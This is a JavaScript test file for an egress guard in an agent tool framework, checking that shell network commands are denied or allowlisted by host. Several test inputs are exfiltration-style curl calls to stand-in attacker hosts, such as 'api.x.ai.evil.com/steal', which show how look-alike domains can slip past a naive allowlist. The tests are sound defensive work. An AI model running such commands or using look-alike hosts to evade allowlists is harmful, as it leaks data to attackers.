import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  checkShellEgress,
  guardToolEgress,
  getEgressPolicy,
} from "../src/security/egress.mjs";

describe("egress policy", () => {
  it("lab default allows curl", () => {
    const r = checkShellEgress({ profile: "lab" }, "curl https://example.com");
    assert.equal(r.ok, true);
  });

  it("prod default denies curl", () => {
    const r = checkShellEgress({ profile: "prod" }, "curl https://example.com");
    assert.equal(r.ok, false);
    assert.match(r.error, /egress denied/);
  });

  it("allowlist permits listed host only", () => {
    const cfg = {
      profile: "prod",
      security: { egress: { mode: "allowlist", allowHosts: ["api.x.ai"] } },
    };
    assert.equal(
      checkShellEgress(cfg, "curl https://api.x.ai/v1/models").ok,
      true
    );
    assert.equal(
      checkShellEgress(cfg, "curl https://evil.example/x").ok,
      false
    );
  });

  it("allowlist host match is domain-boundary — blocks look-alike suffix/prefix, admits a real subdomain", () => {
    const cfg = {
      profile: "prod",
      security: { egress: { mode: "allowlist", allowHosts: ["api.x.ai"] } },
    };
    // Exfil to an attacker domain that merely CONTAINS the allowlisted host as a
    // substring: `api.x.ai.evil.com` is neither api.x.ai nor a subdomain of it.
    // A `.includes(host)` match would wrongly admit it (data leaves to evil.com).
    assert.equal(
      checkShellEgress(cfg, "curl https://api.x.ai.evil.com/steal").ok,
      false,
      "suffix-substring exfil host must be blocked"
    );
    // Prefix-glued look-alike with no dot boundary: `xapi.x.ai` ends with the
    // allowlisted string but is a different registrable host. A dot-less
    // `.endsWith(host)` match would wrongly admit it.
    assert.equal(
      checkShellEgress(cfg, "curl https://xapi.x.ai/x").ok,
      false,
      "no-dot prefix-glued host must be blocked"
    );
    // A genuine subdomain of the allowlisted host stays permitted (guards
    // against over-tightening the match to exact-host only).
    assert.equal(
      checkShellEgress(cfg, "curl https://sub.api.x.ai/v1/models").ok,
      true,
      "real subdomain must be allowed"
    );
  });

  it("local bash without network is always ok in deny mode", () => {
    const r = checkShellEgress({ profile: "prod" }, "echo hello && ls /tmp");
    assert.equal(r.ok, true);
  });

  it("guardToolEgress only applies to bash-like tools", () => {
    const cfg = { profile: "prod" };
    assert.equal(guardToolEgress(cfg, "xclaw_file_read", { path: "/a" }).ok, true);
    assert.equal(
      guardToolEgress(cfg, "xclaw_bash", { command: "wget http://x" }).ok,
      false
    );
  });

  it("XCLAW_EGRESS env overrides profile", () => {
    const prev = process.env.XCLAW_EGRESS;
    process.env.XCLAW_EGRESS = "deny";
    try {
      assert.equal(getEgressPolicy({ profile: "lab" }).mode, "deny");
    } finally {
      if (prev == null) delete process.env.XCLAW_EGRESS;
      else process.env.XCLAW_EGRESS = prev;
    }
  });
});
